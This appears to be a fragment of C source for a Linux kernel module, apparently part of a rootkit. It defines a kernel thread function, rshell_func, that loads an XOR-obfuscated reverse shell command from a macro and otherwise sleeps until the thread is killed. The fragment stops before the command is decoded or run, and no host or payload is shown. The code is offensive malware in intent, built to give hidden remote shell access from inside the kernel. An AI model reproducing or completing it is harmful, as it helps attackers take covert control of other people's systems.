#include "tasks/reverse_shell.h"
#include "utils/encrypt_utils.h"


int rshell_func(void* data) {
    char xor_cmd[] = RSHELL_CMD_OBF;
    if (xor_cmd[0] == '\0') {
        while (!kthread_should_stop()) { // no reverse shell - thread should sleep till killed
            ssleep(3);
        }
        return 0;
    }
